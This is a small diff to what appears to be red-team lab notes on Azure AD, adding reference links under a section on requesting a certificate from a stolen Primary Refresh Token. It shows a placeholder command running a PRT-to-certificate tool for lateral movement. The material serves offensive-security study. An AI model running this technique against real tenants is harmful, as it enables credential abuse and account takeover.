@@ -192,6 +192,9 @@ DESKTOP-M7C1AFM
 
 #### Request a certificate from PRT  - No longer working but BlackBlack US 2022 -MorRubin release a new technique
 - https://github.com/morRubin/PrtToCert
+- reference: https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597  
+- reference: BlackHat US 2022 - https://i.blackhat.com/USA-22/Wednesday/US-22-Rubin-AAD-Joined-Machines-New-Lateral-Movement.pdf 
+- reference: https://github.com/morRubin/NegoExRelay 
 - Code is modified in the lab
 ```
 & 'C:\Program Files\Python39\python.exe' RequestCert.py --tenantId <TENANT ID> --prt <PRT VALUE> --userName <USERNAME> --hexCtx <CONTEXT KEY VALUE> --hexDerivedKey <DERIVED KEY VALUE>
